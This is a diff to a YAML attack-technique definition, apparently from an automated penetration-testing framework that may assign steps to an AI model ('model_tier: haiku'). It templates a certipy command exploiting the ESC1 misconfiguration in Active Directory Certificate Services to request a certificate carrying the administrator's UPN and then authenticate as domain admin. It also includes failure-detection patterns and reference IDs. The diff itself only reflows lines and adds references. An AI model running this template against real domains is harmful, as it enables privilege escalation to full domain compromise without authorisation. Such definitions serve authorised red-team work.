@@ -6,8 +6,8 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: certipy req -u '{username}@{domain}' -p '{password}' -ca '{ca}'
-  -template '{template}' -upn 'administrator@{domain}' -dc-ip {target_ip}
+command_template: certipy req -u '{username}@{domain}' -p '{password}' -ca '{ca}' -template '{template}' -upn 'administrator@{domain}'
+  -dc-ip {target_ip}
 parser: generic_parser
 expected_effects:
 - certificate_obtained
@@ -16,6 +16,15 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "ESC1: Template allows enrollee-supplied SAN + any authenticated user can\
-  \ enroll + EKU allows client auth. Request cert with DA SAN \u2192 auth as DA."
+mechanism: "ESC1: Template allows enrollee-supplied SAN + any authenticated user can enroll + EKU allows client auth. Request\
+  \ cert with DA SAN \u2192 auth as DA."
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+references:
+  ocd_mindmap_node_ids:
+  - 07650d7a48
+  - 49bb4c7c69
+  - 4a5b178911
+  - 61a3d002ab
+  - 8f48806198
+  - bab10c0ce0
+  - bd14897458
